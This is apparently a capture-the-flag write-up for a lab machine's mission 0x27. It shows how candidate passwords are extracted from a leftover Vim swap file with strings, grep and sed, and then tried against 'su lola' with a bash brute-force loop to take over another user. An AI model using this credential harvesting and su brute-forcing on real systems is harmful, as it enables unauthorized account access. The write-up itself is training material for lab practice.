# 0x27

moving from `ariel` to `lola`

---

The mission said:

```bash
ariel@venus:~$ cat mission.txt
################
# MISSION 0x27 #
################

## EN ##
Seems that ariel dont save the password for lola, but there is a temporal file.
```

I checked the home directory and identified a hidden Vim swap file (`.goas.swp`). These files often contain unsaved text from an editor session.

```bash
ariel@venus:~$ ls -la
total 48
...
-rw-r----- 1 root  ariel 12288 Apr  5  2024 .goas.swp
```

To extract the passwords, I used `strings` to find printable text, filtered for the arrow pattern with `grep`, and cleaned up the prefix using `sed`.

```bash
ariel@venus:~$ strings .goas.swp | grep "\-->" | sed 's/-->//' > /tmp/ariel.txt
ariel@venus:~$ cat /tmp/ariel.txt
VVjqJGRrnfKmcgD
bnQgcXYamhSDSff
...
```

Since the list was long, I used a bash one-liner to automate the brute-force attempt against the `su` command.

```bash
ariel@venus:~$ while read p; do echo "$p" | timeout 1 su lola 2>/dev/null && echo "SUCCESS: $p" && break; done < /tmp/ariel.txt
SUCCESS: [REDACTED]
```

### Explanation:

* **`while read p; ... done < /tmp/ariel.txt`**: Reads each potential password from the temporary file one line at a time.
* **`echo "$p" | timeout 1 su lola`**: Pipes the password directly into the `su` command. `timeout 1` ensures the script doesn't hang if the password prompt waits for input.
* **`2>/dev/null`**: Suppresses the standard error output (like "Authentication failure") to keep the terminal clean.
* **`&& echo "SUCCESS: $p" && break`**: If the `su` command succeeds (returns an exit code of 0), it prints the successful password and stops the loop.

With the password `[REDACTED]` confirmed, I logged in as `lola`.

```bash
ariel@venus:~$ su - lola
Password: 
lola@venus:~$ id
uid=1028(lola) gid=1028(lola) groups=1028(lola)
```
